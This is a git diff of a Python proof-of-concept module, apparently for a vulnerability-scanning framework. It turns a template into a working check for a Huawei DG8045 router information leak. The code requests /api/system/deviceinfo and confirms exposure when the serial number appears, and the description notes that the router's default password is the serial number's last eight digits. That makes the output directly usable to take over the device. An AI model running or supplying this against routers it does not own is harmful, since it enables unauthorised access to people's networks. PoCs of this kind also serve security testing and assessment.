@@ -11,17 +11,17 @@ class POC(POCBase):
     _info = {
         "author" : "jijue",                      # POC作者
         "version" : "1",                    # POC版本，默认是1  
-        "CreateDate" : "2021-06-09",        # POC创建时间
-        "UpdateDate" : "2021-06-09",        # POC创建时间
+        "CreateDate" : "2022-01-01",        # POC创建时间
+        "UpdateDate" : "2022-01-01",        # POC创建时间
         "PocDesc" : """
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "华为路由器敏感信息泄露 DG8045 Router 1.0",                        # 漏洞名称
-        "VulnID" : "Blen-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
         "AppName" : "华为DG8045路由器",                     # 漏洞应用名称
         "AppVersion" : "1.0版本",                  # 漏洞应用版本
-        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
             路由器默认密码是序列号的最后8位
         """,                                # 漏洞简要描述
@@ -42,11 +42,13 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "" # url自己按需调整
+        url = self.target + "/api/system/deviceinfo" # url自己按需调整
         
 
-        headers = {"User-Agent":get_random_ua(),
+        headers = {
+                    "User-Agent":get_random_ua(),
                     "Connection":"close",
+                    "X-Requested-With": "XMLHttpRequest",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
@@ -55,7 +57,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "自己调整":#req.status_code == 200 and :
+            if "SerialNumber" in req.text and "DeviceName" in req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
